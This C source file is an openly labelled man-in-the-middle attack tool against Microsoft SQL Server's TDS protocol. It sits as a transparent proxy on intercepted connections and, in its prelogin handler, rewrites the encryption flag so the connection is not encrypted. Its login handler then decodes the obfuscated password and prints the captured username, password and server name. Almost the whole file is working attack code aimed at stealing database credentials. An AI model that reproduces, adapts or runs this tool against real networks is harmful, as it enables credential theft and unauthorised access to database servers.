//tdsrelay.c

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <limits.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <linux/tcp.h>
#include <linux/netfilter_ipv4.h>

#define TDS_UNUSED(x) (void)x;
#define PACKED __attribute__((packed))
#define SOL_IP  0
#define SOL_TCP 6
#define IP_TRANSPARENT	19

typedef struct tds_header_s{
    uint8_t type;
    uint8_t status;
    uint16_t size;
    uint16_t channel;
    uint8_t packet;
    uint8_t window;
    uint8_t data[0];
} PACKED *tds_header_t;

typedef struct offset_and_length_s{
    uint16_t offset;
    uint16_t length;
} PACKED offlen_t;

typedef struct tds_login_packet_s{
    uint32_t length;
    uint32_t version;
    uint32_t packet_size;
    uint32_t client_version;
    uint32_t client_pid;
    uint32_t connection_id;
    uint32_t flags;
    uint32_t time_zone;
    uint32_t lcid;
    offlen_t client;
    offlen_t user;
    offlen_t pass;
    offlen_t app;
    offlen_t server;
    offlen_t _unused1;
    offlen_t library;
    offlen_t locale;
    offlen_t database;
    uint8_t  client_id[6];
    offlen_t sspi;
    offlen_t attch_db;
    union{
        struct{
            offlen_t change_pwd;
            uint32_t sspi;
            uint8_t  data[0];
        }tds_72;
        uint8_t data[0];
    } data;
} PACKED *tds_login_packet_t;

int dumphex(uint8_t* p, int l);

int TDSPrintPasswd(uint8_t* data,int len)
{
    uint8_t p, p1, p2;
    int i;
    for(i=0; i < len; i++) {
        p = data[i*2] ^ '\xA5';
        p1 = p << 4; //upper half byte, most significant. 1a (hex), we are tackling 1
        p2 = p >> 4;
        printf("%c",p1|p2);
    }
    return 0;
}

int TDSPrintString(uint8_t* data,int len)
{
    int i;
    for(i=0;i<len;i++){
        printf("%c",data[i*2]);
    }
    return 0;
}

int TDSDecodeLoginPacket(uint8_t* data,int len)
{
    tds_login_packet_t p = (tds_login_packet_t)data;
    int uo = (p->user.offset),
        ul = (p->user.length),
        po = (p->pass.offset),
        pl = (p->pass.length),
        so = (p->server.offset),
        sl = (p->server.length);
    //printf("uo=%d, ul=%d, po=%d, pl=%d\n",uo,ul,po,pl);
    printf("TDSLogin: user=");
    TDSPrintString(data+uo,ul);
    printf(" pass=");
    TDSPrintPasswd(data+po,pl);
    printf(" server=");
    TDSPrintString(data+so,sl);
    printf("\n");
    return 0;
}

int TDSDecodePreLoginPacket(uint8_t* data, int len)
{
	uint8_t* p = data;
	while(1){
		uint32_t token  = (uint32_t)*p++;
		if(token==0xFF)break;
		uint32_t offset = ntohs(*(uint16_t*)p); p+=2;
		uint32_t length = ntohs(*(uint16_t*)p); p+=2;
		TDS_UNUSED(length);
		//printf("Token: 0x%02x Offset: 0x%04x Length: 0x%04x\n",token,offset,length);
		/*if(length>len)return 0;
		dumphex(data+offset,length);*/
		if(token==0x01){
            data[offset]=0x02;
            printf("TDSPreLogin: Modify B_FENCRYPTION to ENCRYPT_NOT_SUP \n");
            //This would pervent SSL protection during login phase.
		}
	}
	return 0;
}



int TDSRead(int fd, uint8_t* buffer, uint32_t size)
{
    int len;
    tds_header_t header = (tds_header_t)buffer;

    len = recv(fd, buffer, sizeof(struct tds_header_s), 0);
    if(len<=0)goto failed;
    //printf("TDSPacket type=%d size=%d\n",header->type,ntohs(header->size));

    len = recv(fd, buffer+len, ntohs(header->size)-len, 0);
    if(len<=0)goto failed;

    return ntohs(header->size);

failed:
    if(len<0)
        perror("TDSRead: recv failed");
    return len;
}

void TDSDecode(uint8_t* data, int len)
{
    tds_header_t header = (tds_header_t)data;
    switch(header->type)
    {
    case 0x12: //PreLogin
        TDSDecodePreLoginPacket(header->data,len-sizeof(struct tds_header_s));
        break;
    case 0x10://Login
        TDSDecodeLoginPacket(header->data,len-sizeof(struct tds_header_s));
        break;
    }
}

void TDSRelay(int client, int server)
{
	unsigned char buffer[65536];
	fd_set fds;
	int max, len;

	FD_ZERO(&fds);
	max = (client > server) ? client : server;

	while (1)
	{
		FD_SET(client, &fds);
		FD_SET(server, &fds);

		switch (select(max + 1, &fds, NULL, NULL, NULL))
		{
			case -1:
				perror("TDSRelay: select error");
			case 0:
				return;
		}

		if (FD_ISSET(client, &fds))
		{
			len = TDSRead(client, buffer, sizeof(buffer));
			if(len<=0)
			{
                puts("TDSRelay: Client socket disconnected.");
				return;
			}
            TDSDecode(buffer,len);
			send(server, buffer, len, 0);
		}

		if (FD_ISSET(server, &fds))
		{
			len = TDSRead(server, buffer, sizeof(buffer));
			if(len<=0)
			{
                puts("TDSRelay: Server socket disconnected.");
				return;
			}
			TDSDecode(buffer,len);
			send(client, buffer, len, 0);
		}
	}
}

int main(int argc,char** argv)
{
    int lport=1433,rport=1433,notproxy=0;
	struct sockaddr_in listener_addr;
	struct sockaddr_in server_addr;
	struct sockaddr_in client_addr;
	uint32_t client_len =sizeof(client_addr);
	int listener, client, server;
    int true = 1;

    if (argc>1){
        puts(
            "tdsrelay: MSSQL Server TDS Protocol Man-In-Middle attack tool with tproxy support\n"
            " Only affects systems without ca authencation and no force enctyption.\n"
            " You should have NF_TPROXY enabled in your kernel, \n"
            " see http://www.balabit.com/support/community/products/tproxy \n"
            " author: bearice<at>gmail.com \n"
        );
        return 0;
    }
	if ((listener = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		perror("socket");
		return 1;
	}

	listener_addr.sin_family = AF_INET;
	listener_addr.sin_port = htons(lport);
	listener_addr.sin_addr.s_addr = htonl(INADDR_ANY);

	setsockopt(listener, SOL_SOCKET, SO_REUSEADDR,   &true, sizeof(true));
    setsockopt(listener, SOL_IP,     IP_TRANSPARENT, &true, sizeof(true));

	if (bind(listener, (struct sockaddr *) &listener_addr, sizeof(listener_addr)) < 0)
	{
		perror("bind");
		return 1;
	}

	if (listen(listener, 1) < 0)
	{
		perror("listen");
		return 1;
	}

accept:
	printf("TDSRelay: waiting for connection...\n");

	if ((client = accept(listener, (struct sockaddr *) &client_addr, &client_len)) < 0)
	{
		perror("accept");
		return 1;
	}

	socklen_t sock_sz = sizeof(server_addr);

	if (getsockopt(client, SOL_IP, SO_ORIGINAL_DST, &server_addr, &sock_sz) != 0)
	{
		perror("getsockopt");
		fprintf(stderr, "Not a redirected connection?\n");
		exit(1);
	}

    char cbuf[64];
    char sbuf[64];
    strcpy(inet_ntoa(client_addr.sin_addr),cbuf);
    strcpy(inet_ntoa(server_addr.sin_addr),sbuf);

    printf("TDSRelay: Connected from %s:%d to %s:%d\n",
           cbuf,ntohs(client_addr.sin_port),
           sbuf,ntohs(server_addr.sin_port)
    );

    if(fork())
        goto accept;

	if ((server = socket(AF_INET, SOCK_STREAM, 0)) < 0)
	{
		perror("socket");
		close(client);
		return 1;
	}

	server_addr.sin_family = AF_INET;
	server_addr.sin_port = htons(rport);

    setsockopt(server, SOL_IP,    IP_TRANSPARENT, &true, sizeof(true));
    bind(server,(struct sockaddr *) &client_addr,client_len);

	if (connect(server, (struct sockaddr *) &server_addr, sizeof(server_addr)) < 0)
	{
		perror("connect");
		close(client);
		return 1;
	}

	setsockopt(client, SOL_TCP, TCP_NODELAY, &true, sizeof(true));
	setsockopt(server, SOL_TCP, TCP_NODELAY, &true, sizeof(true));

	TDSRelay(client, server);

	close(server);
	close(client);
	return 0;

}

int dumphex(uint8_t* p, int len)
{
	uint8_t * line  = p;
	uint32_t offset = 0,thisline=0;
	int i;
	while (offset < len)
	{
		printf("%04x ", offset);
		thisline = len - offset;
		if (thisline > 16)
			thisline = 16;

		for (i = 0; i < thisline; i++)
			printf("%02x ", line[i]);

		for (; i < 16; i++)
			printf("   ");

		for (i = 0; i < thisline; i++)
			printf("%c", (line[i] >= 0x20 && line[i] < 0x7f) ? line[i] : '.');

		printf("\n");
		offset += thisline;
		line += thisline;
	}
	fflush(stdout);
	return 0;
}
